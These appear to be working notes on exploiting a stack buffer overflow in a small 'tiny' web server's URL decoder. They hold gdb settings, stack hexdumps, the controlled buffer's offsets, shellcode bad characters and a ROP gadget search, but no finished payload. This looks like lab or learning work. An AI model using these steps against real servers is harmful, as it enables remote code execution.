
https://tex.stackexchange.com/questions/497431/drawing-a-memory-layout-diagram-with-tikz

https://insecure.org/stf/smashstack.html

https://link.springer.com/chapter/10.1007/978-3-319-99828-2_21


gdb setup:
```
set set-follow-fork-mode child
set disable-randomization off
```



```
0x00007fffffffd660     d8 db ff ff ff 7f 00 00 90 d7 4e 00 00 00 00 00    ..........N.....
0x00007fffffffd670     01 00 00 00 00 00 00 00 fc d3 40 00 00 00 00 00    ..........@.....
0x00007fffffffd680     18 00 00 00 30 00 00 00 a0 d8 ff ff ff 7f 00 00    ....0...........
0x00007fffffffd690     e0 d7 ff ff ff 7f 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6b0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6d0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6e0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd700     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd710     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd720     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd730     00 00 00 00 00 00 00 00 00 fe c8 3d 38 dc 9a 74    ...........=8..t
0x00007fffffffd740     00 00 00 00 00 00 00 00 b2 b6 40 00 00 00 00 00    ..........@.....
0x00007fffffffd750     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd760     80 8c 4f 00 00 00 00 00 00 00 00 00 00 00 00 00    ..O.............
0x00007fffffffd770     00 00 00 00 00 00 00 00 a8 f4 45 00 00 00 00 00    ..........E.....
0x00007fffffffd780     80 8c 4f 00 00 00 00 00 80 8c 4f 00 00 00 00 00    ..O.......O.....
0x00007fffffffd790     70 8c 4f 00 00 00 00 00 70 8c 4f 00 00 00 00 00    p.O.....p.O.....
0x00007fffffffd7a0     d8 db ff ff ff 7f 00 00 90 d7 4e 00 00 00 00 00    ..........N.....
0x00007fffffffd7b0     01 00 00 00 00 00 00 00 fc d3 40 00 00 00 00 00    ..........@.....
0x00007fffffffd7c0     18 00 00 00 30 00 00 00 a0 d8 ff ff ff 7f 00 00    ....0...........
0x00007fffffffd7d0     e0 d7 ff ff ff 7f 00 00 00 00 00 e0 38 dc 9a 74    ............8..t
0x00007fffffffd7e0     04 00 00 00 00 00 00 00 0f 27 00 00 00 00 00 00    .........'......
0x00007fffffffd7f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd800     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd810     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd820     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd830     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd840     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd850     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd860     00 00 00 00 00 00 00 00 00 fe c8 3d 38 dc 9a 74    ...........=8..t
0x00007fffffffd870     00 00 00 00 00 00 00 00 e8 db ff ff ff 7f 00 00    ................
0x00007fffffffd880     f0 d9 ff ff ff 7f 00 00 01 00 00 00 00 00 00 00    ................
0x00007fffffffd890     f0 d9 ff ff ff 7f 00 00 1d 2e 40 00 00 00 00 00    ..........@.....
0x00007fffffffd8a0     d8 db ff ff ff 7f 00 00 53 8f 30 68 01 00 00 00    ........S.0h....
0x00007fffffffd8b0     f8 d9 ff ff ff 7f 00 00    ........

```

workflow:

```
(pkill tiny || true) && gdb ./tiny
```

we can assume the socket is on fd 3

we can just read and write to that fd


parse_request (before call to bugged url_decode):
  rsp: c590
  rbp: d5c0
```
0x00007fffffffd570     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd580     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd590     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd5a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd5b0     00 00 00 00 00 00 00 00 a0 c5 ff ff ff 7f 00 00    ................
0x00007fffffffd5c0     a0 d8 ff ff ff 7f 00 00 c3 2a 40 00 00 00 00 00    .........*@.....

```

url_decode, before logic execution:
 p $rsp
(void *) 0x7fffffffc550
 p $rbp
(void *) 0x7fffffffc580

```
0x00007fffffffc550     a0 cd ff ff ff 7f 00 00 a0 d1 ff ff 00 04 00 00    ................
0x00007fffffffc560     70 d6 ff ff ff 7f 00 00 a0 c5 ff ff ff 7f 00 00    p...............
0x00007fffffffc570     a2 cd ff ff ff 00 00 00 a0 c5 ff ff ff 7f 00 00    ................
0x00007fffffffc580     c0 d5 ff ff ff 7f 00 00 84 26 40 00 00 00 00 00    .........&@.....
```

first byte moved:
c5a0 -> d670   (0x61)

last byte moved:
c7cf -> d89f  (0x61)

last operation before return: set byte to zero at d8a0

total bytes moved: 0x10d0 (4304)



parse_request (after call to bugged url_decode):
  rsp: c590
  rbp: d5c0

(all good here)

process (after call to parse_request):
  rsp d5d0
  rbp d8a0 (exactly where we just wrote the \0)

```
gefâž¤  hexdump byte $rsp --size=800
0x00007fffffffd5d0     d0 d9 ff ff ff 7f 00 00 00 00 00 00 04 00 00 00    ................
0x00007fffffffd5e0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd5f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd600     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd610     01 00 00 00 00 00 00 00 00 00 00 e4 ff ff ff ff    ................
0x00007fffffffd620     e0 56 47 00 00 00 00 00 00 00 00 00 00 00 00 00    .VG.............
0x00007fffffffd630     d0 d8 ff ff ff 7f 00 00 00 01 00 00 00 00 00 00    ................
0x00007fffffffd640     d0 d8 ff ff 39 39 39 33 00 71 68 3a 56 83 cb 16    ....9993.qh:V...
0x00007fffffffd650     00 00 00 00 00 00 00 00 f8 db ff ff ff 7f 00 00    ................
0x00007fffffffd660     00 da ff ff ff 7f 00 00 01 00 00 00 00 00 00 00    ................
0x00007fffffffd670     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd680     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd690     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6a0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6b0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6c0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6d0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6e0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6f0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd700     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd710     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd720     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd730     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd740     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd750     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd760     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd770     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd780     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd790     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7a0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7b0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7c0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7d0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7e0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7f0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd800     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd810     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd820     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd830     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd840     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd850     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd860     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd870     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd880     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd890     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd8a0     00 da ff ff ff 7f 00 00 1d 2e 40 00 00 00 00 00    ..........@.....
0x00007fffffffd8b0     e8 db ff ff ff 7f 00 00 53 8f 30 68 01 00 00 00    ........S.0h....
0x00007fffffffd8c0     08 da ff ff ff 7f 00 00 00 00 00 00 10 00 00 00    ................

```

buffer starts at d670

before returning, the function does several operations, that overwrite the
last bytes before rbp. this is the stack immediately before "leave;ret"

```
0x00007fffffffd7b0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7c0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7d0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7e0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7f0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd800     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd810     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd820     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd830     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd840     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd850     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd860     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd870     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd880     61 61 61 61 61 61 61 61 5d 03 4c 00 00 00 00 00    aaaaaaaa].L.....
0x00007fffffffd890     61 61 61 61 61 61 61 61 ff ff ff ff 94 01 00 00    aaaaaaaa........
0x00007fffffffd8a0     00 da ff ff ff 7f 00 00 1d 2e 40 00 00 00 00 00    ..........@.....
0x00007fffffffd8b0     e8 db ff ff ff 7f 00 00 53 8f 30 68 01 00 00 00    ........S.0h....
0x00007fffffffd8c0     08 da ff ff ff 7f 00 00 00 00 00 00 10 00 00 00    ................
0x00007fffffffd8d0     2f 68 6f 6d 65 2f 61 6c 2f 70 72 6f 6a 65 63 74    /home/al/project

```

from this, we can see that we control the whole buffer between 
d670 and d880


#writing shellcode:

useful context:

socket fd is saved in process: 
$rbp-0x2c4 (d5dc)
(it's probably always 4 in a demo)
(slightly above our evil buffer)

evil buffer starts at:
$rbp-0x230 (d670)

evil buffer cannot contain:
0x00
0x20
0x0a
0x0d



## rop chain:
```
rp++ --unique -r2 -f ./tiny | less
```
0x4283fb: add al, ch ; call rsp ; (1 found)





